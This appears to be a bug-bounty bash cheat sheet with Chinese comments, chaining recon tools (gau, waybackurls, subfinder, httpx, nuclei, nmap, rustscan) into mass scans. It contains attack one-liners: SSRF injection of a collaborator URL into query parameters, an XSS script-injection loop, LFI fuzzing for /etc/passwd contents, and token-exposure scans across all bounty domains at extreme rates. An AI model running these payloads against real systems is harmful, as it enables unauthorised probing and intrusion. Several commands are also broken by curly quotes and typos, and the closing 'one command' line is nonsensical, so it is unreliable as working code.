#!/bin/bash
# 收集uri并制作fuzz字典
gau -subs example.com >> vul1.txt
waybackurls example.com >> vul2.txt
subfinder -d example.com -silent | waybackurls >> vul3.txt
cat vul1.txt vuln2.txt vul3.txt | grep “=” | sort -u | grep “?” | httpx -silent >> FUZZvul.txt
# ssrf fuzz 使用httpx指定burp代理
xargs -a /root/magicparameter/ssrf.txt -I@ bash -c ‘for url in $(cat FUZZvul.txt); do echo “$url&@=http://burpcollabrator.net”;done’ | httpx -http-proxy http://127.0.0.1:8080
# nuclei扫描
# 使用nuclei提取页面token
cat urls.txt | assestfinder | httprobe | gauplus | nuclei -t exposures/tokens/
nuclei -u URL -t headless/extract-url.yaml -headless -silent | grep "^http" | nuclei -t exposures/tokens/
shodan domain DOMAIN TO BOUNTY | awk '{print $3}' | httpx -silent | nuclei -t /nuclei-templates/
cat list | nuclei -t nuclei-templates/{files,cves,tokens} -v -o result
# 使用gau、waybackurls、gf、httpx、ffuf批量挖掘xss、lfi、ssrf等
# XSS
cat file.txt | gf xss | grep ‘source=’ | qsreplace ‘”><script>confirm(1)</script>’ | while read host do ; do curl –silent –path-as-is –insecure “$host” | grep -qs “<script>confirm(1)” && echo “$host 33[0;31mVulnerablen”;done

# SSRF
findomain -t example.com -q | httpx -silent -threads 1000 | gau |  grep “=” | qsreplace http://YOUR.burpcollaborator.net

# LFI
findomain -t example.com -q |  waybackurls |gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr “root:x” -w ~/wordlist/LFI.txt ; done

# 利用Idea 自带的 Jar 反编译工具
java -Xmx7066M -cp "/Applications/IntelliJ IDEA.app/Contents/plugins/java-decompiler/lib/java-decompiler.jar" org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -mpm=3 ./lib/openam* ./lib-decompiled

# httpx fuzz
httpx -l hosts -paths dir.txt -threads 100 -random-agent -x GET,POST  -tech-detect -status-code  -follow-redirects -title -http-proxy http://127.0.0.1:8080

# nmap fast scan
nmap -sS -T4 -A -p- -iL live_subdomains.txt --min-rate 1000 --max-retries 3

# use subfinder anew naabu httpx nuclei
while true; do subfinder -dL domains.txt -all | anew subs.txt | naabu -silent -p - | httpx -silent | nuclei -t nuclei-templates/ | notify ; sleep 3600; done
#If you collected a bunch of alive IP addresses. Firstly make a Full port scanning then run it
rustscan -a 'hosts.txt' -r 1-65535 | grep Open | tee open_ports.txt | sed 's/Open //' | httpx -silent | nuclei -t ~/nuclei-templates/

#Fingerprinting with Shodan and Nuclei engine:
shodan domain example.com | awk '{print $3}' | httpx -silent | nuclei -t /home/ofjaaah/PENTESTER/nuclei-templates/

#Fully automate your bug bounty with Nuclei and a sprinkle of bash
#/bin/bash
curl -sL https://github.com/projectdiscovery/public-bugbounty-programs/raw/master/chaos-bugbounty-list.json | jq -r '-programs[] |select(.bounty == true) | .domains' | sort -u | cut -d '"' -f2 > urls.txt;
cat urls.txt | sed 's/[]//g' | sed 's/[//g' | sed 's/]//g' | sed -r '/*\s*$/d' > prepared.txt;
for n in $(cat prepared.txt); do
echo -e “Starting main scanner"; echo -e "Scanning: $n";
chaos -bbq -silent -d $n | anew | httprobe -c 5000 | nuclei -t $HOME/nuclei-templates -severity critical,high,medium -retries 1 -timeout 3 -c 3000 -rate-limit 3000 -o nuclei/$n.txt -project -project-path nuclei/project -silent;
done
echo -e "Cleaning up empty scans and other debris"
rm urls.txt && rm prepared.txt
find nuclei/. -size @ -delete
echo -e "Scan completed."

#Boom p1 in one command
recon |xargs| grep -ax( “$sub.example.com) &> /dev/null > outtmp1.txt | httprobe -c 10000000000000 > gau | screenshots  -/outdir1/as> xssscnner300 < "vulntest.txt" | nuclei -T $TARGET | masscan --rate 9999999999 | sort -uqa >/tmp/ > all_final_final.html
